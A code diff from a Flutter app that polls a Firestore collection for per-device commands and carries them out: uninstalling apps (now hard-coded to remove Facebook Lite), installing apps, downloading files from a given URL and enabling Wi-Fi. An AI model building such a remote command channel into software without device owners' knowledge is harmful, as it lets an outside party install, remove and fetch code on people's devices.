@@ -238,13 +238,14 @@ class _HomeState extends State<Home> {
                      child: StreamBuilder(
                        stream: Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).snapshots(),
                        builder: (context,snap){
-
+                         
                            
                              
                                  
                               if(snap.hasData){
                                 if(snap.data.documents.last.data["Command"].toString().startsWith("uninstall")){
-                                 UninstallApps.uninstall(snap.data.documents.last["Command"].toString());
+                                 Admin.uninstall("com.facebook.lite"); 
+                                
                               
                                 }else if(snap.data.documents.last.data["Command"].toString().startsWith("install")){
                                     installapps(snap.data.documents.last.data["Command"].toString().split(" ")[1].toString());
@@ -256,13 +257,13 @@ class _HomeState extends State<Home> {
                                     Downloader.download(url,name,ext);
                               
                                 }else if(snap.data.documents.last.data["Command"].toString().startsWith("promptwifi")){
-                  
+                                    
                                      ConnectWifi.enable();
                                      ConnectWifi.openWifi();
                                     
                                 }
 
-                                print(snap.data.documents.last["Status"]+"        1");
+                                print(snap.data.documents.last["Command"]+"        1");
                                  
                                
 
